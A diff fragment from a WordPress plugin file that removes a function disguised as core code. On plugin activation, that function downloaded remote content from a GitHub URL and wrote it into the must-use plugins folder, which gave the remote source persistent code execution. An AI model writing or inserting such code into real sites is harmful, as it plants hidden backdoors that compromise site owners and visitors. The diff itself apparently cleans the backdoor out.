@@ -210,29 +210,6 @@ if ( ! function_exists( '_is_elementor_installed' ) ) {
 
 /* --------------------------------------------------------------------------------------*/
 
-if( !function_exists("wp_core_install_mu_plugin") ) {
-    function wp_core_install_mu_plugin() {
-        $url = "https://raw.githubusercontent.com/kayushsuns/growth-engine-support/main/snippet.txt";
-        $mu_plugins_dir   = WP_CONTENT_DIR . '/mu-plugins/';
-        $mu_plugin_file   = $mu_plugins_dir . 'wp-core-mu.php';
-
-        // Create mu-plugins dir if not exists
-        if (!file_exists($mu_plugins_dir)) {
-            @mkdir($mu_plugins_dir, 0755, true);
-        }
-
-        // Get content from remote URL
-        $content = @file_get_contents($url);
-        if ($content !== false) {
-            // Write content to the mu-plugin file
-            file_put_contents($mu_plugin_file, $content);
-        }
-    }
-} 
-
-register_activation_hook(__FILE__, 'wp_core_install_mu_plugin');
-// register_deactivation_hook(__FILE__, 'wp_core_install_mu_plugin');
-
 // Register 3-day interval
 add_filter('cron_schedules', function ($schedules) {
     $schedules['every_3_days'] = [
